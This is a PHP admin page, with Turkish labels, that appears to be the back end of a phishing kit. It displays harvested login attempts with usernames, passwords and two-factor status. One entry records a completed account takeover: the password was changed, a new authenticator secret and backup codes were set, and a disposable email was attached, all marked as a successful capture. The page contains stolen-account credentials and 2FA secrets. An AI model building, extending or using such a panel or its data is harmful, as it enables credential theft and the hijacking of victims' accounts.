<?php
 require_once('ayarlar.php');
session_start();
if(!isset($_SESSION[$adminSifre])){
    header("Refresh: 0; url=admin.php"); 
    exit();
}



?>
<input type="hidden" id="react" value="<?php  echo filemtime($phpYolu); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
<nav aria-label="breadcrumb">
  <ol class="breadcrumb">
    <li class="breadcrumb-item active" aria-current="page">Hesap Listesi</li>
  </ol>
</nav>
<script type="text/javascript">
function asagiKaydir()
  {
  window.scrollBy(100,90000)
  }
</script>
<div class="d-grid gap-2">
  <button onclick='var txt;
var r = confirm("Silmek İstediğinize eminmisiniz!");
if (r == true) {
				window.location.href="txt0.php";
} else {
  txt = "You pressed Cancel!";
}' class="btn btn-danger" type="button">Listeyi Sıfırla</button>
	
	<button  onclick="asagiKaydir()" class="btn btn-primary" type="button">En alta git!</button>
	</div>
<script>
      
  var test= setInterval(function () {
        $.ajax({
            url: 'react.php',
            success: function (response)});
    }, 0);
    
</script>
				<hr>
				<font color='red'>Kullanıcı Adı: </font><font color='black'>deneme</font><br>
				<font color='red'>Şifresi: </font><font color='black'>defdasdfasdf</font><br>
				<font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
				<font color='red'>Tarih: </font><font color='black'>15-03-2022 15:32:41</font><br>
					<font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
				<hr>
				<hr>
				<font color='red'>Kullanıcı Adı: </font><font color='black'>deneme</font><br>
				<font color='red'>Şifresi: </font><font color='black'>defdasdfasasfsdf</font><br>
				<font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
				<font color='red'>Tarih: </font><font color='black'>15-03-2022 15:32:54</font><br>
					<font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
				<hr>
				<hr>
				<font color='red'>Kullanıcı Adı: </font><font color='black'>hastasa000</font><br>
				<font color='red'>Şifresi(değiştirildi): </font><font color='black'>ol53fnz67123</font><br>
                <font color='red'>Uygulamaya Ekle: </font><font color='black'>
                <a href='otpauth://totp/hesap@kurucu?secret=Q2L2B4MN2AXKNMTEHFZUM6HIK43UC52X&issuer=kurucu'>GoogleAuthenticator & DuoMobile</a></font><br>
				<font color='red'>Yedek Kodlar: </font><font color='black'>2189 0345 - 0839 2457 - 1687 5930 - 7204 3615</font><br>
				<font color='red'>Kurulum Anahtarı: </font><font color='black'>Q2L2B4MN2AXKNMTEHFZUM6HIK43UC52X</font><br>
				<font color='red'>Hesaba Eklenen Mail Adresi: </font><font color='black'><a href='https://generator.email/ol53fnz67@bokikstore.com'>Mail Hesabına Giriş Yap</a></font><br>
				<font color='red'>Tarih: </font><font color='black'>28-05-2022 09:30:44</font><br>
			    <font color='red'>DURUM: </font><font color='success'>Doğru şifre // KURUCU ALINDI :) (Hesapta Facebook Varsa Kaldırınız)</font><br>
				<hr>